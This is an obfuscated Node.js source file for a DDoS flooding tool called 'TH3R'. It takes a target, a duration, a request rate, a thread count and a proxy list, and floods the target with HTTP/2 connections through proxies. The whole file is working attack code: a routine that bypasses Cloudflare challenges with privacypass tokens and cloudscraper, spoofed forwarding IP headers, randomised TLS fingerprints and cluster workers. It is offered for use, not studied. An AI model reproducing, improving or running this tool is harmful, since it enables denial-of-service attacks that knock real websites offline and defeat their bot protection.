const net = require("net");
const http2 = require('http2');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require('fs');
const gradient = require('gradient-string');
module.exports = function Cloudflare() {
  const _0x26ecca = require("./privacypass");
  const _0x41b9dc = require('cloudscraper');
  const _0x52c52d = require("request");
  var _0x17581e = true;
  function _0x14d7be() {
    _0x26ecca(l7.target);
    console.log("[cloudflare-bypass ~ privacypass]: generated new token");
  }
  if (l7.firewall[0x1] == "captcha") {
    _0x17581e = l7.firewall[0x2];
    _0x14d7be();
  }
  function _0x36c03e(_0x2f5912, _0x1b722c, _0x446010, _0x34bb0a) {
    num = Math.random() * Math.pow(Math.random(), Math.floor(Math.random() * 0xa));
    var _0x5d1fa1 = '';
    if (l7.firewall[0x1] == "captcha" || _0x34bb0a && _0x17581e) {
      _0x52c52d.get({
        'url': l7.target + '?_asds=' + num,
        'gzip': true,
        'proxy': _0x2f5912,
        'headers': {
          'Connection': 'Keep-Alive',
          'Cache-Control': 'max-age=0',
          'Upgrade-Insecure-Requests': 0x1,
          'User-Agent': _0x1b722c,
          'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
          'Accept-Encoding': "gzip, deflate, br",
          'Accept-Language': "en-US;q=0.9"
        }
      }, (_0x1d0b19, _0x2bf953) => {
        if (!_0x2bf953) {
          return false;
        }
        if (_0x2bf953.headers["cf-chl-bypass"] && _0x2bf953.headers["set-cookie"]) {} else {
          if (l7.firewall[0x1] == "captcha") {
            logger("[cloudflare-bypass]: The target is not supporting privacypass");
            return false;
          } else {
            _0x17581e = false;
          }
        }
        _0x5d1fa1 = _0x2bf953.headers['set-cookie'].shift().split(';').shift();
        if (l7.firewall[0x1] == 'captcha' && _0x17581e || _0x34bb0a && _0x17581e) {
          _0x41b9dc.get({
            'url': l7.target + "?_asds=" + num,
            'gzip': true,
            'proxy': _0x2f5912,
            'headers': {
              'Connection': "Keep-Alive",
              'Cache-Control': "max-age=0",
              'Upgrade-Insecure-Requests': 0x1,
              'User-Agent': _0x1b722c,
              'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
              'Accept-Encoding': "gzip, deflate, br",
              'Accept-Language': 'en-US;q=0.9',
              'challenge-bypass-token': l7.privacypass,
              'Cookie': _0x5d1fa1
            }
          }, (_0x38a55a, _0x3c2d49) => {
            if (_0x38a55a || !_0x3c2d49) {
              return false;
            }
            if (_0x3c2d49.headers["set-cookie"]) {
              _0x5d1fa1 += "; " + _0x3c2d49.headers["set-cookie"].shift().split(';').shift();
              _0x41b9dc.get({
                'url': l7.target + "?_asds=" + num,
                'proxy': _0x2f5912,
                'headers': {
                  'Connection': "Keep-Alive",
                  'Cache-Control': 'max-age=0',
                  'Upgrade-Insecure-Requests': 0x1,
                  'User-Agent': _0x1b722c,
                  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                  'Accept-Encoding': "gzip, deflate, br",
                  'Accept-Language': "en-US;q=0.9",
                  'Cookie': _0x5d1fa1
                }
              }, (_0x5b5c11, _0x415237, _0x171b24) => {
                if (_0x5b5c11 || !_0x415237 || _0x415237 && _0x415237.statusCode == 0x193) {
                  console.warn("[cloudflare-bypass ~ privacypass]: Failed to bypass with privacypass, generating new token:");
                  _0x14d7be();
                  return;
                }
                _0x446010(_0x5d1fa1);
              });
            } else {
              console.log(_0x3c2d49.statusCode, _0x3c2d49.headers);
              if (_0x3c2d49.headers['cf-chl-bypass-resp']) {
                let _0x543136 = _0x3c2d49.headers['cf-chl-bypass-resp'];
                switch (_0x543136) {
                  case '6':
                    console.warn("[privacy-pass]: internal server connection error occurred");
                    break;
                  case '5':
                    console.warn("[privacy-pass]: token verification failed for " + l7.target);
                    _0x14d7be();
                    break;
                  case '7':
                    console.warn("[privacy-pass]: server indicated a bad client request");
                    break;
                  case '8':
                    console.warn("[privacy-pass]: server sent unrecognised response code (" + header.value + ')');
                    break;
                }
                return _0x36c03e(_0x2f5912, _0x1b722c, _0x446010, true);
              }
            }
          });
        } else {
          _0x41b9dc.get({
            'url': l7.target + "?_asds=" + num,
            'proxy': _0x2f5912,
            'headers': {
              'Connection': "Keep-Alive",
              'Cache-Control': "max-age=0",
              'Upgrade-Insecure-Requests': 0x1,
              'User-Agent': _0x1b722c,
              'Accept-Language': "en-US;q=0.9"
            }
          }, (_0x2e0da0, _0x2857d2) => {
            if (_0x2e0da0 || !_0x2857d2 || !_0x2857d2.request.headers.cookie) {
              if (_0x2e0da0) {
                if (_0x2e0da0.name == "CaptchaError") {
                  return _0x36c03e(_0x2f5912, _0x1b722c, _0x446010, true);
                }
              }
              return false;
            }
            _0x446010(_0x2857d2.request.headers.cookie);
          });
        }
      });
    } else if (l7.firewall[0x1] == 'uam' && _0x17581e == false) {
      _0x41b9dc.get({
        'url': l7.target + "?_asds=" + num,
        'proxy': _0x2f5912,
        'headers': {
          'Upgrade-Insecure-Requests': 0x1,
          'User-Agent': _0x1b722c
        }
      }, (_0x2c2d45, _0x273244, _0x1096ab) => {
        if (_0x2c2d45) {
          if (_0x2c2d45.name == 'CaptchaError') {
            return _0x36c03e(_0x2f5912, _0x1b722c, _0x446010, true);
          }
          return false;
        }
        if (_0x273244 && _0x273244.request.headers.cookie) {
          _0x446010(_0x273244.request.headers.cookie);
        } else {
          if (_0x273244 && _0x1096ab && _0x273244.headers.server == "cloudflare") {
            if (_0x273244 && _0x1096ab && /Why do I have to complete a CAPTCHA/.test(_0x1096ab) && _0x273244.headers.server == "cloudflare" && _0x273244.statusCode !== 0xc8) {
              return _0x36c03e(_0x2f5912, _0x1b722c, _0x446010, true);
            }
          } else {}
        }
      });
    } else {
      _0x41b9dc.get({
        'url': l7.target + "?_asds=" + num,
        'gzip': true,
        'proxy': _0x2f5912,
        'headers': {
          'Connection': "Keep-Alive",
          'Cache-Control': "max-age=0",
          'Upgrade-Insecure-Requests': 0x1,
          'User-Agent': _0x1b722c,
          'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
          'Accept-Encoding': "gzip, deflate, br",
          'Accept-Language': "en-US;q=0.9"
        }
      }, (_0x38faf8, _0x47b75e, _0x16bc79) => {
        if (_0x38faf8 || !_0x47b75e || !_0x16bc79 || !_0x47b75e.headers["set-cookie"]) {
          if (_0x47b75e && _0x16bc79 && /Why do I have to complete a CAPTCHA/.test(_0x16bc79) && _0x47b75e.headers.server == "cloudflare" && _0x47b75e.statusCode !== 0xc8) {
            return _0x36c03e(_0x2f5912, _0x1b722c, _0x446010, true);
          }
          return false;
        }
        _0x5d1fa1 = _0x47b75e.headers["set-cookie"].shift().split(';').shift();
        _0x446010(_0x5d1fa1);
      });
    }
  }
  return _0x36c03e;
};
process.setMaxListeners(0x0);
require("events").EventEmitter.defaultMaxListeners = 0x0;
process.on("uncaughtException", function (_0x4b776a) {});
if (process.argv.length < 0x7) {
  console.log(gradient.vice("\n╔┓┏╦━━╦┓╔┓╔━━╗╔╗\n║┗┛║┗━╣┃║┃║╯╰║║║\n║┏┓║┏━╣┗╣┗╣╰╯║╠╣\n╚┛┗╩━━╩━╩━╩━━╝╚╝\n\n████████╗██╗░░██╗██████╗░██████╗░\n╚══██╔══╝██║░░██║╚════██╗██╔══██╗\n░░░██║░░░███████║░█████╔╝██████╔╝\n░░░██║░░░██╔══██║░╚═══██╗██╔══██╗\n░░░██║░░░██║░░██║██████╔╝██║░░██║\n░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝\nnode TH3R <target> <duration> <request per second> <threads> <proxyfile>"));
  ;
  process.exit();
}
const headers = {};
function readLines(_0x5f3c38) {
  return fs.readFileSync(_0x5f3c38, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(_0x156c25, _0x5f22c2) {
  return Math.floor(Math.random() * (_0x5f22c2 - _0x156c25) + _0x156c25);
}
function randomElement(_0x2ba312) {
  return _0x2ba312[Math.floor(Math.random() * (_0x2ba312.length - 0x0) + 0x0)];
}
function randstr(_0x43ba10) {
  let _0x2c76a5 = '';
  const _0x5bc7d4 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length;
  for (let _0x236791 = 0x0; _0x236791 < _0x43ba10; _0x236791++) {
    _0x2c76a5 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * _0x5bc7d4));
  }
  return _0x2c76a5;
}
const ip_spoof = () => {
  return Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff);
};
const spoofed = Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff);
const args = {
  'target': process.argv[0x2],
  'time': parseInt(process.argv[0x3]),
  'Rate': parseInt(process.argv[0x4]),
  'threads': parseInt(process.argv[0x5]),
  'proxyFile': process.argv[0x6]
};
const sig = ["ecdsa_secp256r1_sha256", "ecdsa_secp384r1_sha384", "ecdsa_secp521r1_sha512", "rsa_pss_rsae_sha256", "rsa_pss_rsae_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha256", 'rsa_pkcs1_sha384', "rsa_pkcs1_sha512"];
const cplist = ['ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES', "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES", 'ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES', "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES"];
const accept_header = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"];
const lang_header = ["en-US,en;q=0.9"];
const encoding_header = ["gzip, deflate, br"];
const control_header = ['no-cache', "max-age=0"];
const refers = ["https://www.google.com/", 'https://www.facebook.com/', "https://www.twitter.com/", "https://www.youtube.com/", 'https://www.linkedin.com/'];
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':');
const uap = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36"];
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  for (let counter = 0x1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}
;
class NetSocket {
  constructor() {}
  ["HTTP"](_0x3c5792, _0x3dc5e7) {
    const _0x56d82d = "CONNECT " + _0x3c5792.address + ":443 HTTP/1.1\r\nHost: " + _0x3c5792.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x5b60a1 = new Buffer.from(_0x56d82d);
    const _0x76a1ee = net.connect({
      'host': _0x3c5792.host,
      'port': _0x3c5792.port
    });
    _0x76a1ee.setTimeout(_0x3c5792.timeout * 0x186a0);
    _0x76a1ee.setKeepAlive(true, 0x186a0);
    _0x76a1ee.on("connect", () => {
      _0x76a1ee.write(_0x5b60a1);
    });
    _0x76a1ee.on("data", _0x42fa9e => {
      const _0x449d65 = _0x42fa9e.toString("utf-8");
      const _0x1d78e1 = _0x449d65.includes("HTTP/1.1 200");
      if (_0x1d78e1 === false) {
        _0x76a1ee.destroy();
        return _0x3dc5e7(undefined, "error: invalid response from proxy server");
      }
      return _0x3dc5e7(_0x76a1ee, undefined);
    });
    _0x76a1ee.on("timeout", () => {
      _0x76a1ee.destroy();
      return _0x3dc5e7(undefined, "error: timeout exceeded");
    });
    _0x76a1ee.on("error", _0xadca8 => {
      _0x76a1ee.destroy();
      return _0x3dc5e7(undefined, "error: " + _0xadca8);
    });
  }
}
const Socker = new NetSocket();
headers[":method"] = 'GET';
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + '?' + randstr(0x5) + '=' + randstr(0x19);
headers[":scheme"] = 'https';
headers['x-forwarded-proto'] = 'https';
headers['accept-language'] = lang;
headers["accept-encoding"] = encoding;
headers["X-Forwarded-For"] = spoofed;
headers["X-Forwarded-Host"] = spoofed;
headers["Real-IP"] = spoofed;
headers["cache-control"] = control;
headers["sec-ch-ua"] = "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"";
headers["sec-ch-ua-mobile"] = '?0';
headers["sec-ch-ua-platform"] = 'Windows';
headers.origin = "https://" + parsedTarget.host;
headers.referer = "https://" + parsedTarget.host;
headers['upgrade-insecure-requests'] = '1';
headers.accept = accept;
headers["user-agent"] = randstr(0xf);
headers["sec-fetch-dest"] = 'document';
headers["sec-fetch-mode"] = 'navigate';
headers['sec-fetch-site'] = "none";
headers.TE = "trailers";
headers.Trailer = "Max-Forwards";
headers["sec-fetch-user"] = '?1';
headers["x-requested-with"] = "XMLHttpRequest";
function runFlooder() {
  const _0x908436 = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
  const _0x40b1e2 = _0x908436.split(':');
  headers[":authority"] = parsedTarget.host;
  headers.referer = 'https://' + parsedTarget.host + '/?' + randstr(0xf);
  headers.origin = "https://" + parsedTarget.host;
  const _0x850d81 = {
    'host': _0x40b1e2[0x0],
    'port': ~~_0x40b1e2[0x1],
    'address': parsedTarget.host + ":443",
    'timeout': 0x64
  };
  Socker.HTTP(_0x850d81, (_0x23ada7, _0xc26992) => {
    if (_0xc26992) {
      return;
    }
    _0x23ada7.setKeepAlive(true, 0x927c0);
    const _0x57ca6e = {
      'host': parsedTarget.host,
      'port': 0x1bb,
      'secure': true,
      'ALPNProtocols': ['h2'],
      'sigals': siga,
      'socket': _0x23ada7,
      'ciphers': tls.getCiphers().join(':') + cipper,
      'ecdhCurve': "prime256v1:X25519",
      'host': parsedTarget.host,
      'rejectUnauthorized': false,
      'servername': parsedTarget.host,
      'secureProtocol': ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"]
    };
    const _0xfe8e89 = tls.connect(0x1bb, parsedTarget.host, _0x57ca6e);
    _0xfe8e89.setKeepAlive(true, 0xea60);
    const _0x1cca98 = http2.connect(parsedTarget.href, {
      'protocol': "https:",
      'settings': {
        'headerTableSize': 0x10000,
        'maxConcurrentStreams': 0x7d0,
        'initialWindowSize': 0xffff,
        'maxHeaderListSize': 0x10000,
        'enablePush': false
      },
      'maxSessionMemory': 0xfa00,
      'maxDeflateDynamicTableSize': 0xffffffff,
      'createConnection': () => _0xfe8e89,
      'socket': _0x23ada7
    });
    _0x1cca98.settings({
      'headerTableSize': 0x10000,
      'maxConcurrentStreams': 0x7d0,
      'initialWindowSize': 0x600000,
      'maxHeaderListSize': 0x10000,
      'enablePush': false
    });
    _0x1cca98.on("connect", () => {});
    _0x1cca98.on("close", () => {
      _0x1cca98.destroy();
      _0x23ada7.destroy();
      return;
    });
  });
  (function (_0x819e1c, _0x1d7116, _0x550d2c) {});
}
console.log(gradient.vice("[!] ATTACK HAS BEEN SENT."));
const KillScript = () => process.exit(0x1);
console.log("Method by @AkuHengkerEfEF");
setTimeout(KillScript, args.time * 0x3e8);